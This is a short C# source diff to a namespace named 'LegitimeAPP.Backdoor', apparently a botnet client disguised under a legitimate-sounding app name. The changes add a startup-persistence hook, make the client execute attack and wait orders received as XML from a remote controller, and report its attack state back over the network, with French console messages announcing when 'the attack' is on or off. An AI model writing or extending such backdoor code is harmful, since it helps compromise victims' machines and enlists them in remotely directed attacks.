@@ -10,7 +10,8 @@ using System.Collections;
 using System.Collections.Generic ;
 using System.Xml;
 using System.Xml.Serialization;
-using LegitimeAPP.Shared ; 
+using LegitimeAPP.Shared ;
+using LegitimeAPP.OS ; 
 
 namespace LegitimeAPP.Backdoor {
     public class Connection {
@@ -42,17 +43,22 @@ namespace LegitimeAPP.Backdoor {
 
             order = new Order(TypeAction.WAIT) ;
 
+            _ = new Startup() ; 
 
-                order.NewAttackOrder += delegate {
+
+            order.NewAttackOrder += delegate {
                 Console.WriteLine("L'attaque est on") ;
 
-
+                WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.ATTACK))) ; 
 
                 _attackInProgress = true ; 
             } ;
 
             order.EndAttackOrder += delegate {
                 Console.WriteLine("L'attaque est off") ;
+
+                WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.WAIT))) ; 
+                
 
                 _attackInProgress = false ;  
             } ;  
@@ -170,10 +176,10 @@ namespace LegitimeAPP.Backdoor {
 
                         Console.WriteLine(message) ; 
  
-                        //Order order = Data<Order>.XmlToData(message) ; 
+                        //Order order = Data<Order>.XmlToData(message) ;
 
-                        WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.ATTACK))) ; 
-                            order.Change(order) ;
+
+                            order.Change(Data<Order>.XmlToData(message)) ;
                             order.Start() ;  
                       
 
